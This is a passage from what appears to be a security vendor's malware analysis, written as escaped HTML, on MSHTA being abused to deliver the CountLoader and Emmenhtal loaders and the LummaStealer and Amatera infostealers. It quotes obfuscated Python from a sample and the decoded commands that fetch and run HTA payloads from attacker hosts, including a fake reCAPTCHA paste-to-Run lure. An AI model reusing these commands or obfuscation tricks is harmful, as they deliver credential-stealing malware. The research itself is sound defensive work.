execution of a seemingly innocuous legacy Windows utility can quickly lead to account theft, financial fraud, data loss, or broader infection of the affected system.\u003C\u002Fp\u003E\u003Cp\u003EThis pattern is consistent with MSHTA’s role as a lightweight execution and staging mechanism. It is well-suited for retrieving obfuscated HTA content, launching in-memory scripts, and handing off execution to PowerShell, \u003Ca\u003EWScript\u003C\u002Fa\u003E, msiexec, or a final malware payload.\u003C\u002Fp\u003E\u003Ch2 id=\"lummastealer-and-amatera-via-countloader\"\u003ELummaStealer and Amatera via CountLoader\u003C\u002Fh2\u003E\u003Cp\u003EOne of the most prominent MSHTA-related clusters in our telemetry involved \u003Cem\u003ECountLoader\u003C\u002Fem\u003E, an HTA-based loader used to deliver commodity malware, most notably the information stealers \u003Cem\u003ELummaStealer \u003C\u002Fem\u003Eand \u003Cem\u003EAmatera\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThese threats are relevant to users because their primary goal is to steal sensitive data, including credentials, browser-stored information, session tokens, and cryptocurrency-related data. In this delivery chain, MSHTA plays an important role as a lightweight execution mechanism that retrieves and launches the next-stage HTA payload from remote infrastructure.\u003C\u002Fp\u003E\u003Cp\u003EThe vast majority of detections for mshta.exe come from instances where the command line contains domains that appear to be legitimate services but are hosted on the .cc TLD (e.g., google-services[.]cc, memory-scanner[.]cc). \u003C\u002Fp\u003E\u003Cp\u003EThis campaign began to gain traction toward the end of 2025, peaked at the end of January 2026, and has since declined gradually as attackers shifted to other platforms to host the payloads.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"901\" height=\"119\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png 901w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThese domains are often labeled as LummaStealer infrastructure on VirusTotal because Lumma is often the final payload delivered through this chain, and the same domains often appear in Lumma-related configurations.\u003C\u002Fp\u003E\u003Cp\u003EHowever, the loader appears to be distinct and can be correlated with existing reports of CountLoader [5], [6]. We also observed the same loader chain delivering Amatera, another commodity information stealer.\u003C\u002Fp\u003E\u003Cp\u003EThe lures used in this \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fblog\u002Flabs\u002Flummastealer-second-life-castleloader\"\u003Ecampaign\u003C\u002Fa\u003E are similar to those employed by CastleLoader [7].\u003C\u002Fp\u003E\u003Cp\u003EVictims are enticed through messages, social media posts, or SEO-poisoned websites that promise free or cracked software. The downloaded archive may include the password directly in its filename or contain a document indicating the password to use.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fbc56be63-7ca9-43bd-9f48-1361891ab51d.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"152\" height=\"212\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003EArchive content with Python interpreter disguised as setup\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe victim executes a Setup.exe file, which is in fact a legitimate Python interpreter. Alongside Setup.exe, the archive contains one or more \u003Cstrong\u003Epython3&lt;X&gt;.dll\u003C\u002Fstrong\u003E files that the interpreter automatically loads.\u003C\u002Fp\u003E\u003Cp\u003EThese are legitimate Python core DLLs, but during Python runtime initialization, they cause the local Lib directory to be used for dependency resolution and basic module loading. In the analyzed sample, the malicious Python script resided in \u003Cstrong\u003E.\\Lib\\encodings\\aliases.py\u003C\u002Fstrong\u003E and was launched through the corresponding \u003Cstrong\u003E__init__.py\u003C\u002Fstrong\u003E file.\u003C\u002Fp\u003E\u003Cp\u003EThe same directory also contains a renamed MSHTA executable, iso2022.exe. The malicious aliases.py script launches this binary to contact the C2 infrastructure and retrieve the HTA loader.\u003C\u002Fp\u003E\u003Cp\u003ETo construct the malicious URLs, the Python code defines individual characters as global variables and combines them through formatted strings before finally invoking os.system(cmd) to execute the resulting command line.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E### Regions\n\nglobal_region = f'{ctype}d Lib{typeB}encodings'\nlocal_format = f'{ptype}{typeE}org{typeA}wp{typeD}{atype}{typeA}{gtype}{typeA}stats{typeE}{ltype}'\nen_UK = f'{htype}{ttype}{ttype}p{stype}{typeC}{typeB}{typeB}'\nen_US = f'{typeE}{ctype}{ctype}'\nen_ES = f'iso2022{typeE}e{xtype}e'\n\n### Protection\nmem_protect = f'{global_region} {typeH}{typeH} {en_ES} {en_UK}{local_format}'\nram_protect = f'alpha{typeD}centavr{typeE}{ctype}{ctype}'\nrem_protect = f'{ctype}{mtype}d {typeA}{ctype} {stype}{ttype}ar{ttype} {typeA}b \\\"\\\" {ctype}{mtype}d {typeA}{ctype} '\n\n### Probes\npositive_probe = f'{mem_protect} {typeH} {en_ES} {en_UK}{ram_protect}'\nnegative_probe = f'{rem_protect}'\n\ncmd = f'{positive_probe}'\nos.system(cmd)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe resulting command line is:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Ecd Lib\\encodings &amp;&amp; iso2022.exe https:\\\\planetitude[.]org\u002Fwp-admin\u002Fchellenge\u002Fstats.location &amp; iso2022[.]exe https:\\\\alpha-centavr[.]cc\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe HTA decodes the next payload from an array of character codes and launches it. The variable names seem to be generated from a dictionary of technical terms, and they vary from file to file.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-2.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"248\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-2.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-2.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003ECountLoader payload decode function\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-3.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"656\" height=\"1296\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-3.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-3.png 656w\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003ECountLoader killchain\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EStarting in late February 2026, we observed a new \u003Cem\u003ECountLoader \u003C\u002Fem\u003Edomain-hosting pattern. The naming convention remained similar, using domains that imitate legitimate service names, but the infrastructure shifted to .vg and .gl TLDs.\u003C\u002Fp\u003E\u003Cp\u003EExamples include \u003Cstrong\u003Eexplorer[.]vg, ccleaner[.]gl\u003C\u002Fstrong\u003E, and \u003Cstrong\u003Emicroservice[.]gl\u003C\u002Fstrong\u003E. The HTA scripts embedded at these locations follow the same obfuscation pattern observed in the earlier .cc-based infrastructure.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"570\" height=\"260\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003EMSHTA with .vg or .gl domains\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"emmenhtal-loader\"\u003EEmmenhtal Loader\u003C\u002Fh2\u003E\u003Cp\u003EAnother prominent MSHTA-based infection chain we observed involved \u003Cem\u003EEmmenhtal Loader\u003C\u002Fem\u003E [3], a multi-stage loader used to deliver commodity malware, including information stealers such as \u003Cem\u003ELummaStealer\u003C\u002Fem\u003E. In this campaign, MSHTA serves as an early-stage execution mechanism that retrieves and launches a remote HTA payload, which then unfolds through multiple script-based stages.\u003C\u002Fp\u003E\u003Cp\u003EThe infection chain begins with phishing messages on Discord that contain links to pages designed to hijack the clipboard and trick the user into executing a malicious command line as part of a fake human-verification process.\u003C\u002Fp\u003E\u003Cp\u003EThese pages resemble legitimate reCAPTCHA systems, but are hosted on suspicious websites (e.g. \u003Cstrong\u003Ehumancheck[.]shop\u002Fpass-this-step-to-continue[.]html\u003C\u002Fstrong\u003E) and include JavaScript code that copies a malicious command line to the clipboard when the user accesses the page.\u003C\u002Fp\u003E\u003Cp\u003EThe user is then lured into pressing Win + R to open the Run dialog, followed by Ctrl + V and Enter to paste and execute the command. As a result, explorer.exe appears to legitimately launch mshta.exe with a command line such as:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta[.]exe hxxps[:\u002F\u002F]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com\u002Fdir\u002Fsixth\u002Fsingl6[.]mp4 # &nbsp;✅ ''I am not a robot - reCAPTCHA Verification ID: 2165\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAlthough these websites are often taken down quickly by their hosting providers, some server responses remain available on VirusTotal and can still be analyzed.\u003C\u002Fp\u003E\u003Cp\u003EThe file hosted on the server is a valid HTA, but it is intentionally bloated with large amounts of garbage data that are ignored during execution. Embedded within this content are a few valid HTML blocks that contain the malicious script. The file is never written to disk; instead, it is executed directly in memory by mshta.exe.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-5.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"234\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-5.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-5.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe HTML structure is spread across the file, inserted between unusable data that is ignored.
